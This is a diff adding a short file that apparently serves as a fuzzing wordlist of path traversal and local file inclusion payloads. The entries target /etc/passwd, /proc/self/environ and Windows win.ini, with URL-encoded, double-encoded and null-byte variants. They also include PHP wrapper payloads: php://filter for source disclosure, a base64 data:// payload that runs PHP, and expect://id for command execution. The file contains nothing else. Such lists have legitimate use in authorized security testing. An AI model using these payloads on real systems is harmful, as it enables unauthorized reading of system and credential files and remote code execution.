@@ -1,0 +1,14 @@
+../../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+/etc/passwd
+/etc/passwd%00
+/proc/self/environ
+/proc/self/cmdline
+C:\windows\win.ini
+..\..\..\..\windows\win.ini
+file:///etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+expect://id
